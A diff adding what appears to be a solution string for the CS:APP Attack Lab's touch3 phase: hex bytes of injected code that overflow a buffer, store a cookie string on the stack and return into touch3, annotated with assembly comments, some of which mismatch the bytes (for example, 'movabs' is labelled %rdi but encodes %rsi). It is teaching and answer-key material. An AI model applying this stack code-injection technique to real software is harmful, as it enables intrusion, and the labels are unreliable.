@@ -1,0 +1,12 @@
+/* cookie is 5 9 b 9 9 7 f a */
+/* 35 39 62 39 39 37 66 61 cookie as a string */
+48 be 35 39 62 39 39	/* movabs $0x6166373939623935,%rdi -> copy string in rdi */
+37 66 61
+48 89 74 24 f8         	/* %rdi,-8(%rsp)          -> copy string to the stack    */
+c6 04 24 00             /* movb   $0x0,(%rsp)     -> terminate string            */
+bf a0 dc 61 55       	/* mov  $0x5561dca0,%edi  -> set rdi to address above    */
+bc 98 dc 61 55          /* mov  $0x5561dc98,%esp  -> set rsp to 0x5561dca0 - 8   */
+c3                      /* retq                   -> call touch3                 */
+00 00                   /*                        -> filling...                  */
+fa 18 40 00 00 00 00 00 /* 0x4018fa               -> address of touch3           */
+78 dc 61 55             /* 0x5561dc78             -> address of my code          */
